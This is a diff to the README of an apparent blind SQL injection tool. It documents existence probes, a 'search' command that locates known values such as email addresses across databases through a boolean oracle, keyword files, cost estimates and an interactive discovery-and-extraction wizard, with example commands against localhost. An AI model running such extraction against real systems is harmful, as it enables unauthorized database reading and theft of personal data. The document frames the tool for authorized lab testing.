@@ -260,6 +260,136 @@ requests to 45, and every row comes back flagged `already_known`, with
 python -m blindsqli enumerate ... --knowledge known.json
 ```
 
+### Verifying a target exists before extracting it
+
+A scalar subquery that selects nothing returns `NULL`. The engine now **checks a
+target exists before iterating character by character**, so a row that is not
+there costs a single request instead of a full, futile search:
+
+- **Automatic.** Length discovery distinguishes "NULL / absent" from "longer than
+  `max_length`" with one existence probe. A missing target is reported with
+  `"exists": false` and `"complete": false` instead of triggering a max-length
+  extraction. In a quick benchmark a missing target dropped from ~78 requests to
+  **2**.
+- **Explicit.** Pass `--verify-exists` to `extract` to probe up front (a missing
+  target then costs exactly **1** request), or to `enumerate` to skip `NULL`
+  cells cheaply. NULL rows are reported as `<NULL> (skipped)` and are not counted
+  as extraction failures.
+
+```bash
+# a row that may not exist: confirm first, don't waste a full search on it
+python -m blindsqli extract --url ... --verify-exists \
+    --target-name user --expr "(SELECT username FROM users WHERE id=99999)"
+# -> { "value": "", "exists": false, "complete": false, ... }
+```
+
+The result's `exists` field is `true` when a value was recovered, `false` when
+the target was proven NULL/absent, and `null` when existence was not probed.
+
+---
+
+## Finding where known values live (cross-scope value search)
+
+When you know several values but not where any of them are stored, the `search`
+command locates each one across the authorized scope. It **discovers metadata
+once**, ranks the most likely columns for each keyword with heuristics, and
+confirms only the promising ones through the boolean oracle. Discovery is
+separated from extraction, so you narrow the search space before spending
+expensive blind requests, and nothing is dumped wholesale.
+
+```bash
+# one value
+python -m blindsqli search --url http://localhost:3000/ --param q \
+    --keyword alice@example.com
+
+# many values from a file, restricted to two databases, results saved
+python -m blindsqli search --url http://localhost:3000/ --param q \
+    --keywords-file keywords.txt \
+    --databases appdb,billing \
+    --meta-file scope.json \          # metadata index: reused on later runs
+    --results-file matches.json
+```
+
+Each keyword is an **independent** investigation; results are kept per keyword
+and never merged into one query. A confirmed match records the database, schema,
+table, column, a ready-to-use `WHERE` clause, confidence and a timestamp, so you
+can hand it straight to targeted extraction:
+
+```bash
+# a confirmed match at billing.dbo.customers.email -> pull the matching rows
+python -m blindsqli enumerate --url ... --what rows \
+    --database billing --table customers --columns id,email \
+    --where "email LIKE '%alice@example.com%'"
+```
+
+### Keyword files
+
+One keyword per line. Blank lines and `#` comments are ignored; a `# Heading`
+line tags the keywords beneath it; `#!` sets defaults; per-keyword options come
+after ` ;; `:
+
+```text
+# Accounts                 (this heading tags the two lines below)
+admin
+alice@example.com
+
+#! mode=substring case=insensitive
+invoice ;; exact           (this one is an exact, whole-value match)
+project-x ;; tag=infra
+```
+
+### Controlling cost
+
+Every blind request is expensive, so `search` estimates the scope first
+(keywords x databases x tables x columns) and prints a cost level before doing
+the work:
+
+```text
+Estimated search scope:
+  Keywords:                     2
+  Databases:                    3
+  Tables:                       9
+  Columns (known):             27
+  Candidates/keyword:           5
+  Confirmation requests: ~     10
+  Cost level:            LOW
+```
+
+Ranking plus `--max-candidates N` (default 50) bound the cost: only the N most
+likely columns per keyword are tested. `--estimate-only` stops after the
+estimate; `--exhaustive` tests every column (can be very slow); `--search-workers
+N` searches independent keywords concurrently; `--count-rows` also counts
+matching rows per hit; `--stop-after K` stops a keyword after K confirmations.
+
+### Interactive wizard
+
+`wizard` guides the whole workflow (discover -> filter -> discover deeper ->
+extract, or load keywords -> search) and remembers what was discovered and
+selected, so you don't have to memorise flags:
+
+```bash
+python -m blindsqli wizard --url http://localhost:3000/ --param q \
+    --meta-file scope.json --results-file matches.json
+```
+
+```text
+What would you like to do?
+  1. Discover databases
+  2. Discover tables
+  3. Discover columns
+  4. Extract a specific object
+  5. Search for known values
+  6. Load a keyword file
+  7. Review previous discoveries
+  8. Estimate search scope / cost
+  9. Save session (metadata + results)
+  0. Quit
+```
+
+At each stage it offers the logical next steps and lets you narrow by index, an
+exact name, or a `LIKE` pattern (`%user%`). See
+[WIZARD_AND_SEARCH.md](WIZARD_AND_SEARCH.md) for a full walkthrough.
+
 ---
 
 ## Configuration
@@ -433,4 +563,14 @@ If your target reflects the payload in some other encoding, pin an explicit
 - The tool implements **only** the boolean/error side channel. It does not use
   the app's conventional SQLi path to read data directly, and it has no feature
   for discovering or scanning arbitrary external hosts.
+- Discovery, the metadata index and the value search are **read-only**: they use
+  `INFORMATION_SCHEMA`/`sys.databases` reads, `COUNT`/`OFFSET` selects and
+  `LIKE`/`=` comparisons only. The tool never creates, alters, inserts or drops
+  anything; the metadata index and results are ordinary local JSON files you
+  control, not database objects. Persisting any state to the target would need a
+  deliberate, unsupported change.
+- The scope allowlist applies to every command, including `search` and `wizard`.
+  Keywords are searched only within the authorized target, and each keyword is an
+  independent lookup -- values are never correlated into one query unless you
+  build that query yourself.
 - Intended use: learning and authorized testing against a local vulnerable lab.
